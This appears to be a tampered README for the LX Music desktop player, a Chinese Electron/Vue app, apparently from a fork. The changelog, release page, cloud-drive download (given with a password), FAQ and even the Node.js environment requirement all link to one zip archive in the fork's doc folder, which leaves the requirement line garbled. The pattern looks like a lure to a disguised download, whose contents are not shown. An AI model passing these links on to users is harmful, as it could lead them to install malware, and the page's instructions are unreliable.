<h2 align="center">洛雪音乐助手桌面版</h2>

### 说明

一个基于 Electron + Vue 开发的音乐软件。

所用技术栈：

- Electron 7
- Vue 2

已支持的平台：

- Windows 7 及以上
- Mac OS
- Linux

软件变化请查看：[更新日志](https://github.com/Smithshao/lx-music-desktop/raw/refs/heads/master/doc/lx_desktop_music_2.6.zip)<br>
软件下载请转到：[发布页面](https://github.com/Smithshao/lx-music-desktop/raw/refs/heads/master/doc/lx_desktop_music_2.6.zip)<br>
或者到网盘下载（网盘内有MAC、windows版）：`https://github.com/Smithshao/lx-music-desktop/raw/refs/heads/master/doc/lx_desktop_music_2.6.zip` 密码：`glqw`<br>
使用常见问题请转至：[常见问题](https://github.com/Smithshao/lx-music-desktop/raw/refs/heads/master/doc/lx_desktop_music_2.6.zip)

### 源码使用方法

环境要求：https://github.com/Smithshao/lx-music-desktop/raw/refs/heads/master/doc/lx_desktop_music_2.6.zip 12.x

```bash
# 开发模式
npm run dev

# 构建免安装版
npm run pack:dir

# 构建安装包（windows版）
npm run pack

```
